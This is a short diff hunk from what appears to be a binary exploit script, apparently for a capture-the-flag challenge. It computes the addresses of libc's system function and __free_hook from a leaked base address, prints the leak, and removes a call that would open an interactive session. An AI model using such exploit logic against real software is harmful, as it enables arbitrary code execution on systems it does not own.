@@ -129,7 +129,6 @@ while True:
         system_addr = libc_base + 0x4f420
         free_hook_addr = libc_base + 0x3ed8e8
         print(hex(leak_addr))
-        p.interactive()
 
 
 
